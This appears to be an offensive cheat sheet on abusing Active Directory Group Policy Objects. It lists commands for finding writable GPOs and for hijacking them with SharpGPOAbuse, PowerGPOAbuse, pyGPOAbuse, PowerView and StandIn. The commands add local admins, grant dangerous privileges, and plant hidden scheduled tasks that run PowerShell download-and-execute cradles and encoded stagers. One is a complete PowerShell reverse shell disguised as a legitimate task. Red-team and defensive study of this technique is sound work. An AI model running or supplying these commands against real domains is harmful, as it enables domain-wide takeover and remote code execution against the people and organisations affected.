

# What

"Group Policy" is a management feature of Active Directory. It allows admins to manage computers and users. Group Policy Objetcs (GPOs) make up Group Policies. GPOs are associated to AD objects (sites, domains, organizational units (OUs)).

GPO are stored in the DC in `\\<domain.dns>\SYSVOL\<domain.dns>\Policies\<GPOName>\`, inside two folders **User** and **Machine**. If you have the right to edit the GPO you can connect to the DC and replace the files. Planned Tasks are located at `Machine\Preferences\ScheduledTasks`.

In certain scenarios, an attacker can gain control over GPOs. Some ACEs can give that control.

- `WriteProperty` to the `GPC-File-Sys-Path` property of a GPO (specific GUID specified)
- `GenericAll`, `GenericWrite`, `WriteProperty` to any property (no GUID specified)
- `WriteDacl`, `WriteOwner`

# Finding Vulnerable GPOs

### PowerView

In order to find a vulnerable GPO, you have to be in a session on the machine that's connected to the domain (evil-winrm or whatever).

Then you need to import the PowerView module: https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

```bash
Get-DomainObjectAcl -Identity "SuperSecureGPO" -ResolveGUIDs |  Where-Object {($_.ActiveDirectoryRights.ToString() -match "GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner")}
```

### StandIn.exe

https://github.com/FuzzySecurity/StandIn

```bash
./StandIn.exe --gpo
```

# Abusing GPOs

## Abuse GPO with SharpGPOAbuse

```bash
# Build and configure SharpGPOAbuse
$ git clone https://github.com/FSecureLABS/SharpGPOAbuse
$ Install-Package CommandLineParser -Version 1.9.3.15
$ ILMerge.exe /out:C:\SharpGPOAbuse.exe C:\Release\SharpGPOAbuse.exe C:\Release\CommandLine.dll

# Adding User Rights
.\SharpGPOAbuse.exe --AddUserRights --UserRights "SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight" --UserAccount bob.smith --GPOName "Vulnerable GPO"

# Adding a Local Admin
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName "Vulnerable GPO"

# Configuring a User or Computer Logon Script
.\SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"

# Configuring a Computer or User Immediate Task
# /!\ Intended to "run once" per GPO refresh, not run once per system
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"
.\SharpGPOAbuse.exe --AddComputerTask --GPOName "VULNERABLE_GPO" --Author 'LAB.LOCAL\User' --TaskName "EvilTask" --Arguments  "/c powershell.exe -nop -w hidden -enc BASE64_ENCODED_COMMAND " --Command "cmd.exe" --Force
```

## Abuse GPO with PowerGPOAbuse

- [https://github.com/rootSySdk/PowerGPOAbuse](https://github.com/rootSySdk/PowerGPOAbuse)

```bash
PS> . .\PowerGPOAbuse.ps1

# Adding a localadmin 
PS> Add-LocalAdmin -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'

# Assign a new right 
PS> Add-UserRights -Rights "SeLoadDriverPrivilege","SeDebugPrivilege" -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'

# Adding a New Computer/User script 
PS> Add-ComputerScript/Add-UserScript -ScriptName 'EvilScript' -ScriptContent $(Get-Content evil.ps1) -GPOIdentity 'SuperSecureGPO'

# Create an immediate task 
PS> Add-GPOImmediateTask -TaskName 'eviltask' -Command 'powershell.exe /c' -CommandArguments "'$(Get-Content evil.ps1)'" -Author Administrator -Scope Computer/User -GPOIdentity 'SuperSecureGPO'
```

## Abuse GPO with pyGPOAbuse

```bash
$ git clone https://github.com/Hackndo/pyGPOAbuse

# Add john user to local administrators group (Password: H4x00r123..)
./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012"

# Reverse shell example
./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012" \ 
    -powershell \ 
    -command "\$client = New-Object System.Net.Sockets.TCPClient('10.20.0.2',1234);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()" \ 
    -taskname "Completely Legit Task" \
    -description "Dis is legit, pliz no delete" \ 
    -user
```

## Abuse GPO with PowerView

```bash
# Enumerate GPO
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}

# New-GPOImmediateTask to push an Empire stager out to machines via VulnGPO
New-GPOImmediateTask -TaskName Debugging -GPODisplayName VulnGPO -CommandArguments '-NoP -NonI -W Hidden -Enc AAAAAAA...' -Force
```

## Abuse GPO with StandIn

```bash
# Add a local administrator
StandIn.exe --gpo --filter "Vulnerable GPO name" --localadmin user002

# Set custom right to a user
StandIn.exe --gpo --filter Shards --setuserrights user002 --grant "SeDebugPrivilege,SeLoadDriverPrivilege"

# Execute a custom command
StandIn.exe --gpo --filter Shards --tasktype computer --taskname Liber --author "REDHOOK\Administrator" --command "C:\I\do\the\thing.exe" --args "with args"
```